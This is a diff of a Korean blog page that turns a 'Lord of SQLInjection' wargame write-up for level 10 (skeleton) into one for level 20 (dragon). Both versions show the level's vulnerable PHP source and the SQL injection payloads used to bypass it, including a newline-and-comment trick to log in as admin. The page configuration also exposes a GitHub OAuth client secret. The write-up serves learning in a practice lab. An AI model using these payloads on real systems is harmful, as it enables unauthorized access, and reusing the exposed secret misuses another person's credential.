@@ -24,29 +24,29 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"koun9hwan.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 <meta property="og:type" content="article">
-<meta property="og:title" content="[Lord of SQLInjection] [10번_skeleton] Write UP">
-<meta property="og:url" content="https://koun9hwan.github.io/2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/index.html">
+<meta property="og:title" content="[Lord of SQLInjection] [20번_dragon] Write UP">
+<meta property="og:url" content="https://koun9hwan.github.io/2021/11/21/2021-11-21-Lord_of_SQLInjection_20_dragon/index.html">
 <meta property="og:site_name" content="Koun9Hwan">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/skeleton/source.png">
-<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/skeleton/solve_1.png">
-<meta property="article:published_time" content="2021-10-03T15:00:00.000Z">
-<meta property="article:modified_time" content="2021-10-03T18:01:43.556Z">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/dragon/source.png">
+<meta property="og:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/dragon/solve_1.png">
+<meta property="article:published_time" content="2021-11-21T12:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-20T15:56:25.832Z">
 <meta property="article:author" content="KoungHwan">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="Write UP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/skeleton/source.png">
+<meta name="twitter:image" content="https://koun9hwan.github.io/images/Lord%20of%20SQLInjection/dragon/source.png">
 
 
-<link rel="canonical" href="https://koun9hwan.github.io/2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/">
+<link rel="canonical" href="https://koun9hwan.github.io/2021/11/21/2021-11-21-Lord_of_SQLInjection_20_dragon/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://koun9hwan.github.io/2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/","path":"2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/","title":"[Lord of SQLInjection] [10번_skeleton] Write UP"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://koun9hwan.github.io/2021/11/21/2021-11-21-Lord_of_SQLInjection_20_dragon/","path":"2021/11/21/2021-11-21-Lord_of_SQLInjection_20_dragon/","title":"[Lord of SQLInjection] [20번_dragon] Write UP"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>[Lord of SQLInjection] [10번_skeleton] Write UP | Koun9Hwan</title>
+<title>[Lord of SQLInjection] [20번_dragon] Write UP | Koun9Hwan</title>
   
 
 
@@ -153,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%A8-%EC%A0%84%EC%B2%B4-%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C"><span class="nav-text">🎨 전체 소스코드</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%94%94-%EC%A4%91%EC%9A%94-%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C-%ED%95%B4%EC%84%9D"><span class="nav-text">🔔 중요 소스코드 해석</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">1 줄 해석</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%EC%A4%84-3-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">2 줄 ~ 3 줄 해석</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%99%86%E2%80%8D%E2%99%80%EF%B8%8F-SOLVE"><span class="nav-text">🙆‍♀️ SOLVE</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%8E%A8-%EC%A0%84%EC%B2%B4-%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C"><span class="nav-text">🎨 전체 소스코드</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%94%94-%EC%A4%91%EC%9A%94-%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C-%ED%95%B4%EC%84%9D"><span class="nav-text">🔔 중요 소스코드 해석</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">1 줄 해석</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%EC%A4%84-4-%EC%A4%84-%ED%95%B4%EC%84%9D"><span class="nav-text">2 줄 ~ 4 줄 해석</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%F0%9F%99%86%E2%80%8D%E2%99%80%EF%B8%8F-SOLVE"><span class="nav-text">🙆‍♀️ SOLVE</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -224,7 +224,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://koun9hwan.github.io/2021/10/04/2021-10-04-Lord_of_SQLInjection_10_skeleton/">
+    <link itemprop="mainEntityOfPage" href="https://koun9hwan.github.io/2021/11/21/2021-11-21-Lord_of_SQLInjection_20_dragon/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -237,7 +237,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          [Lord of SQLInjection] [10번_skeleton] Write UP
+          [Lord of SQLInjection] [20번_dragon] Write UP
         </h1>
 
         <div class="post-meta-container">
@@ -249,7 +249,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-10-04 00:00:00 / Modified: 03:01:43" itemprop="dateCreated datePublished" datetime="2021-10-04T00:00:00+09:00">2021-10-04</time>
+      <time title="Created: 2021-11-21 21:00:00 / Modified: 00:56:25" itemprop="dateCreated datePublished" datetime="2021-11-21T21:00:00+09:00">2021-11-21</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -274,14 +274,14 @@
     <div class="post-body" itemprop="articleBody">
         <h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>
 
-<p>10번 문제인 skeleton을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<p>20번 문제인 dragon을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
 <br>
 
-<img src="/images/Lord of SQLInjection/skeleton/source.png">
+<img src="/images/Lord of SQLInjection/dragon/source.png">
 
 <br>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;dragon&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
@@ -292,40 +292,53 @@
 
 <h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;dragon&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <br>
 
 <br>
 
-<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>
+<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p><code>preg_match</code>라는 함수가 있습니다.</p>
-<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
-<p>문자열 <code>prob</code>와 문자 <code>_</code> <code>.</code> <code>(</code> <code>)</code> 를 필터링 하고 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링 할 때 사용합니다.</p>
+<p><code>pw 파라미터</code>에서 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
 <br>
 
 <br>
 
-<h2 id="2-줄-3-줄-해석"><a href="#2-줄-3-줄-해석" class="headerlink" title="2 줄 ~ 3 줄 해석"></a>2 줄 ~ 3 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_skeleton where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27; and 1=0&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;skeleton&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="2-줄-4-줄-해석"><a href="#2-줄-4-줄-해석" class="headerlink" title="2 줄 ~ 4 줄 해석"></a>2 줄 ~ 4 줄 해석</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_dragon where id=&#x27;guest&#x27;# and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;dragon&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-<p>쿼리문을 보면 <code>id</code>는 guest로 고정되어있고 <code>pw</code>파라미터 뒤에 <code>and 1=0</code>으로 거짓으로 만들어주고 있습니다.</p>
-<p>마지막 줄 조건문을 보면 <code>id</code>가 admin 이어야 한다는 조건이 있습니다.</p>
+<p>쿼리문을 보면 <code>id</code>를 guest로 해주고 주석 처리 하는 것을 볼 수 있습니다.</p>
+<p><code>id</code> 를 admin으로 만들어주면 문제가 풀립니다.</p>
 <br>
 
 <br>
 
 <hr>
+<br>
+
 <h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>
 
-<img src="/images/Lord of SQLInjection/skeleton/solve_1.png">
+<p><code>#</code>은 한 줄 주석입니다. </p>
+<p>즉, 다음 줄은 주석이 아닌 정상적인 쿼리문으로 작동 시킬 수 있습니다.</p>
+<br>
+
+<p><code>pw</code> 인자 부분에 <code>개행문자(%0a)</code>를 넣어 쿼리문을 완성 시키겠습니다.</p>
+<p><code>select id from prob_dragon where id=&#39;guest&#39;</code><font color="green"><del># and pw=’’</del></font><code>%0a and pw=&#39;1&#39; or id=&#39;admin&#39;%23&#39;</code> </p>
+<p>위 쿼리문을 넣으면 우회가 됩니다.</p>
+<br>
 
 <br>
 
-<p>쿼리문 맨 뒤 <code>and 1=0</code>를 무력화 시키기 위해 주석을 사용하였습니다.</p>
-<blockquote>
-<p>?pw=1&#x27; or id= &#x27;admin&#x27;#<del><span style="color:green">&#x27; and 1=0</span></del></p>
-</blockquote>
+<p><code>select id from prob_dragon where id=&#39;guest&#39; </code><font color="green"><del># and pw=’’</del></font></p>
+<p><code>and pw=&#39;1&#39; or id=&#39;admin&#39;#</code> </p>
+<br>
+
+<img src="/images/Lord of SQLInjection/dragon/solve_1.png">
+
+<br>
+
 <br>
 
 <blockquote>
@@ -348,14 +361,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/10/03/2021-10-03-Lord_of_SQLInjection_9_vampire/" rel="prev" title="[Lord of SQLInjection] [9번_vampire] Write UP">
-                  <i class="fa fa-chevron-left"></i> [Lord of SQLInjection] [9번_vampire] Write UP
+                <a href="/2021/11/16/2021-11-16-Lord_of_SQLInjection_19_xavis/" rel="prev" title="[Lord of SQLInjection] [19번_xavis] Write UP">
+                  <i class="fa fa-chevron-left"></i> [Lord of SQLInjection] [19번_xavis] Write UP
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/10/21/2021-10-21-Lord_of_SQLInjection_11_golem/" rel="next" title="[Lord of SQLInjection] [11번_golem] Write UP">
-                  [Lord of SQLInjection] [11번_golem] Write UP <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -408,7 +418,7 @@
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
 
-<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"koun9hwan","repo":"blog-comments","client_id":"5ccab05e870b0e138ca8","client_secret":"3592ccc63d9364524a0a6ce592a5ffb9b1f6c867","admin_user":"koun9hwan","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"acd578c438bdb7759477fdf23cb4597c"}</script>
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"koun9hwan","repo":"blog-comments","client_id":"5ccab05e870b0e138ca8","client_secret":"3592ccc63d9364524a0a6ce592a5ffb9b1f6c867","admin_user":"koun9hwan","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"c877b815658972fd86c315e461b294f0"}</script>
 <script src="/js/third-party/comments/gitalk.js"></script>
 
 </body>
